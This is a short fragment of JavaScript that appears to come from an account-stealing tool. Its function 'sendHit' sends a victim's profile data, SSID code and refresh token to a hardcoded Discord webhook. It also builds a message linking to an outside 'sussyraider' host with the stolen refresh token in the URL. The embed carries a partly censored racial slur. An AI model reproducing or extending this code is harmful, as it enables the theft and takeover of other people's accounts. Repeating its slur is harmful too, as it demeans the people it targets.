...
const sendHit = async (name, id, firstProfileData, refresh, SSIDCode) => {
  const webhookClient = new WebhookClient({ url: 'https://discord.com/api/webhooks/1159749902763565108/qWDU1i3V7MTuWTyt_65-5DpAAGWG_VKkTXHDhUgynawuRwQSUXoULJP5eDVmhNxGsyvT' });
  ...
  .setAuthor({ name: 'Hit Some Ni**a Hard', url: 'https://sussyraider.onrender.com/refresh?refreshToken=' + refresh })
  .addFields(
